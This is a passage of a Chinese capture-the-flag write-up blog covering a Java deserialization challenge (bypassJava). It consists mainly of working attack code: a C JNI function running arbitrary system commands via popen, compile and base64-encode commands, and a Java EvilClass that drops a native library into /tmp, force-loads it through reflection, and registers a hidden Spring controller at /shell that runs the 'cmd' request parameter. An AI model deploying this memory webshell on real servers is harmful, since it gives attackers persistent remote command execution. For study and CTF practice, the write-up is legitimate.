class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe))</span><br><span class="line">        { <span class="comment">//将管道输出到result中</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    pclose(pipe); <span class="comment">//关闭管道</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//返回1表示运行成功</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里开启了一个缓冲区， <code>popen</code>  是 C 中执行命令时打开的一个管道，以只读模式打开。如果为空，则命令执行失败，返回.</p>
<p>同时 while 使用 feof 检测 pipe 状态，未结束就持续从 pipe 里面每次最大获取 128 个字节内容，放到缓冲区，然后将结果追加到 <code>result</code>  中.</p>
<p>随后</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span><span class="params">(JNIEnv *env, jclass class_object, jstring jstr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>); <span class="comment">// 获取 Java 字符串 jstr 的 UTF-8 编码</span></span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">""</span>; <span class="comment">// 定义一个存放命令执行结果的字符数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result)) <span class="comment">// 调用之前定义的 execmd 函数来执行系统命令</span></span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 如果命令执行成功，你可以在这里进行一些处理，但代码中被注释掉了</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">""</span>; <span class="comment">// 定义一个存放返回消息的字符数组</span></span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result); <span class="comment">// 将命令执行结果追加到返回消息</span></span><br><span class="line"></span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); <span class="comment">// 创建一个 Java 字符串，用于存储返回消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult; <span class="comment">// 返回 Java 字符串，包含命令执行结果</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="jni-规范"><a class="markdownIt-Anchor" href="#jni规范">#</a> JNI 规范</h3>
<p><strong>JNI 原型函数：</strong> JNI 规范定义了一组标准的 JNI 函数原型，如 <code>GetStringUTFChars</code> 、 <code>ReleaseStringUTFChars</code>  等，以方便操作字符串、数组、引用等常见任务。</p>
<p><strong>JNI 函数命名规范：</strong> JNI 函数的命名必须遵循特定的命名规范，通常是 Java 类名（用下划线替代点号）后跟 Java 方法名。例如，Java 类 <code>com.example.MyClass</code>  中的方法 <code>myNativeFunction</code>  对应的 JNI 函数应为 <code>Java_com_example_MyClass_myNativeFunction</code> 。</p>
<p><strong>JNIEnv 指针：</strong> JNI 函数的第一个参数是一个 <code>JNIEnv</code>  指针，它是一个关于 JNI 环境的上下文。通过 <code>JNIEnv</code> ，JNI 函数可以访问 Java 虚拟机的各种功能，如对象创建、方法调用和异常处理。</p>
<p><strong>数据类型转换：</strong> JNI 定义了各种数据类型的对应关系，以便 Java 和本地代码之间的数据传递。例如，Java 的 <code>int</code>  对应 JNI 的 <code>jint</code> ，Java 的 <code>String</code>  对应 JNI 的 <code>jstring</code>  等。JNI 函数允许在这些数据类型之间进行转换。</p>
<p>从参数上看：它接受三个参数： <code>JNIEnv *env</code> （JNI 环境指针）、 <code>jclass class_object</code> （表示 Java 类的类对象）、 <code>jstring jstr</code> （一个 Java 字符串）。</p>
<p>通过  <code>(*env)-&gt;GetStringUTFChars</code>  函数将 Java 字符串  <code>jstr</code>  转换为 C 字符串  <code>cstr</code> ，这是因为  <code>execmd</code>  函数需要接受 C 字符串作为参数。</p>
<p>中间执行命令，存储.</p>
<p>使用  <code>(*env)-&gt;NewStringUTF</code>  函数创建一个新的 Java 字符串  <code>cmdresult</code> ，用于存储返回消息。</p>
<p>将两部分放在一起，形成 c 文件，然后编译</p>
<p>编译:</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.c</span><br><span class="line">base64 -w <span class="number">0</span> libcmd.so &gt; Evil.txt</span><br></pre></td></tr></tbody></table></figure>
<p>写文件的操作</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">"rw"</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>最终写个 load 的内存🐎</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.RandomAccessFile;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="title">extends</span> <span class="title">AbstractTranslet</span> {</span></span><br><span class="line">    public <span class="type">static</span> native String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">    private <span class="type">static</span> final String EVIL_JNI_BASE64 = <span class="string">""</span>;<span class="comment">//👴就不放在这里了,太长了,自己生成</span></span><br><span class="line">    private <span class="type">static</span> final String LIB_PATH = <span class="string">"/tmp/libcmd.so"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> {</span><br><span class="line"></span><br><span class="line">        try{</span><br><span class="line">            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);</span><br><span class="line">            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">"rw"</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span></span><br><span class="line">            ClassLoader cmdLoader = EvilClass.class.getClassLoader();</span><br><span class="line">            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="string">"java.lang.ClassLoader"</span>);</span><br><span class="line">            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="string">"java.lang.ClassLoader$NativeLibrary"</span>);</span><br><span class="line">            Method load = nativeLibraryClazz.getDeclaredMethod(<span class="string">"load"</span>, String.class, boolean.class);</span><br><span class="line"></span><br><span class="line">            load.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Field field = classLoaderClazz.getDeclaredField(<span class="string">"nativeLibraries"</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);</span><br><span class="line">            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);</span><br><span class="line">            nativeLibraryCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line">            libs.addElement(nativeLibraryObj);</span><br><span class="line">            field.<span class="built_in">set</span>(cmdLoader, libs);</span><br><span class="line">            load.invoke(nativeLibraryObj, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入内存马</span></span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            Field configField = mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            Method method2 = EvilClass.class.getMethod(<span class="string">"shell"</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            RequestMappingInfo info = RequestMappingInfo.paths(<span class="string">"/shell"</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            EvilClass springControllerMemShell = new EvilClass();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }catch (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> throws IOException {</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != null) {</span><br><span class="line">            String execRes = EvilClass.execCmd(cmd);</span><br><span class="line">            response.getWriter().write(execRes);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> throws TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> throws TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>NativeLibrary</code>  包装到 Vector,Vector 是 <code>Classloader</code>  中 <code>nativeLibraries</code>  的值，</p>
<p>一般来说用</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">"cmd"</span>);</span><br><span class="line">        Command command = new Command();</span><br><span class="line">        String ipconfig = command.exec(<span class="string">"ipconfig"</span>);</span><br><span class="line">        System.out.println(ipconfig);</span><br></pre></td></tr></tbody></table></figure>
<p>题目 ban 了.</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106155628.png" alt="微信截图_20231106155628"></p>
<p>芜湖，真√Ⅷ 爽，√Ⅷ 真爽，终出了.</p>
<p>捏麻麻地，👴花了几天时间，学了一堆东西.</p>
<p>怎么制作链子，怎么 python 发包，👴在前面已经分析过了。不用问了😅</p>

      </section>

      
      
        <nav class="article-nav">
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">N1CTF_复现</h2>
        </a>
      
      <div class="card-text--row">Newer</div>
    </div>
  </article>
</div>
          
          
        </nav>
      

      <section class="page-message-container layout-padding">
        


  
  

  
  


      </section>
    </div>
    <div class="widget-info">
      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-body">
    
      <img src="https://raw.githubusercontent.com/1llustrious/img/main/avatar1.jpg" class="soft-size--round soft-style--box" alt="1llustrious">
    
    
      <h2>1llustrious</h2>
    
    
      <p>没有未来的未来,不是我想要的未来</p>
    

    <div class="count-box">
      <div class="count-box--item">
        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
</svg>
        <span>3</span>
      </div>
      <div class="count-box--item">
        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
        0
      </div>
      <div class="count-box--item">
        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
        2
      </div>
    </div>
  </div>
</section>

      
<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
</svg>
    <span>TOC</span>
  </div>
  <div class="widget-body">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#das0raysxcbctf"><span class="toc-number">1.</span> <span class="toc-text"> DAS0RAYSxCBCTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">2.</span> <span class="toc-text"> 写在前面</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#yet-another-box"><span class="toc-number">3.</span> <span class="toc-text"> yet another box</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nps"><span class="toc-number">4.</span> <span class="toc-text"> nps</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#deserializeupload"><span class="toc-number">5.</span> <span class="toc-text"> Deserialize?Upload!</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dasctfxcbctf_2023_bypassjava"><span class="toc-number">6.</span> <span class="toc-text"> DASCTFXCBCTF_2023_bypassJava</span></a></li></ol>
    
  </div>
</section>


      
<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
</svg>
    <span>NOTICE</span>
  </div>
  <div class="widget-body">
    <p>君の知らない物語</p>
  </div>
</section>


      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
    <span>CATEGORYS</span>
  </div>
  <div class="widget-body">
    <ul class="categorys-list">
      
    </ul>
  </div>
</section>

      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
    <span>TAGS</span>
  </div>
  <div class="widget-body">
    <div class="tags-cloud">
      <a href="/tags/CTF/" style="font-size: 20px;" class="tags-cloud-10">CTF</a> <a href="/tags/WP/" style="font-size: 10px;" class="tags-cloud-0">WP</a>
    </div>
  </div>
</section>
    </div>
  </article>
</div>

    <!-- footer container -->
<footer id="footer" class="footer">
  <div class="footer-container">
    
    <div class="social-icons">
      
        
          <a href="https://github.com/1llustrious" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
</svg>
          </a>
        
      
    </div>
     
    <p>© 2023 <a href="/" target="_blank">1llustrious</a></p>

    

    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>

    <p>
      <a href="javascript:;" id="theme-light">🌞 浅色</a>
      <a href="javascript:;" id="theme-dark">🌛 深色</a>
      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
    </p>
  </div>
</footer>
  </div>

